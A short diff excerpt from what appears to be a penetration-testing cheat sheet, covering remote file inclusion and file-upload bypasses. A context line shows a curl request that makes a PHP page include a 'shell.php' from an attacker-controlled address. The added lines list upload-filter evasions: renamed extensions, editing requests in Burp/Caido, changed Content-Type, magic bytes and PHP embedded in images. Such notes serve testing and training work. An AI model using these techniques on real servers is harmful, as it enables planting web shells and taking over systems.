@@ -150,7 +150,10 @@ curl http://<url>/index.php?page=http://<local_ip>/shell.php
 > [PayloadsAllTheThings > File Upload](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
 
 - Rename files to bypass uploader logic such as `.phps, .php7, .pHP, .png.php, .php%20`
-- If the validation is on the front, the request can be altered with Caido/Burp changing the extension.
+- If the validation is on the frontend, the request can be altered with Caido/Burp by changing the extension.
+- Change Content-Type.
+- Add magic bytes.
+- Embed PHP code in the image file.
 
 ```shell
 # after uploading the file
